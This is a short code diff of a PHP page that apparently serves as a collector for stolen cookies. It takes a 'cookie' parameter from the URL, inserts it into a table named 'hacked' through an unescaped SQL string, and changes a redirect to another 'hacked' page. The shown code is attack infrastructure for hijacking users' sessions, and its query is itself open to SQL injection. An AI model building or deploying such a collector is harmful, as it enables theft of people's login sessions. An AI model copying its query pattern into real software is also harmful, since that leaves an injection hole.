@@ -4,7 +4,7 @@ if (isset($_GET["cookie"])){
 	$cookie = $_GET["cookie"] ?? '';
 	$sql = "INSERT into hacked values ('$cookie');";
 	mysqli_query($conn,$sql);
-	//header("Location: /hacked/iframe_2.php");
+	header("Location: /hacked/hacked_3.php");
 }
 ?>
 <html>
